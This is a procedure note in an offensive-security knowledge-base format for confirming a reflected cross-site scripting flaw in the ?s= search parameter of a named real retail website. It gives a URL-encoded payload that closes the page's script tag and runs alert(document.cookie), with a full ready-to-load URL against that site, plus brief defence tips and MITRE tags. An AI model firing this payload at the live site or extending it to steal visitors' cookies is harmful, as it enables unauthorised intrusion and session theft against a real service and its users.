---
tags:
  - xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:28:12.236Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 01b1359c-9ff1-4f85-a578-f74b0560190e
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-and-Confirm-Reflected-XSS-Payload

## Summary

This procedure tests for reflected XSS by injecting a payload into the ?s= parameter, breaking out of a script context to execute arbitrary JavaScript, such as alerting cookies.

## Description

The ?s= parameter on the shop pages reflects user input directly into a script without encoding, allowing attackers to close existing script tags and inject new ones. This enables JavaScript execution in the victim's browser context, potentially leading to data theft.

## Requirements

1. Access to the vulnerable shop pages
2. Knowledge of URL encoding for payloads
3. Browser to observe execution

## Defense

Defensive measures and detection strategies:

- Output encode all user inputs in JavaScript contexts
- Deploy CSP headers to block inline scripts
- Monitor for alert() or suspicious JS in logs

## Objectives

1. Confirm XSS vulnerability by executing a test payload
2. Verify ability to access document.cookie
3. Assess payload reliability across browsers

## Instructions

### Step 1: Craft and Inject Basic Payload

**Context**: Use a payload that closes the script tag and injects an alert to test execution.

Append to the URL:

```url
?s=%E2%80%98);%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

Full example URL: https://marthastewart.com/shop/all.html?s=%E2%80%98);%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

> Load the page; an alert should pop up showing cookies if vulnerable.

### Step 2: Validate Execution

**Context**: Check if the script runs in the page's context.

Observe the alert contents and ensure no errors in console.

> Expected output: Alert displays cookie string; console shows no CSP blocks.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- injection
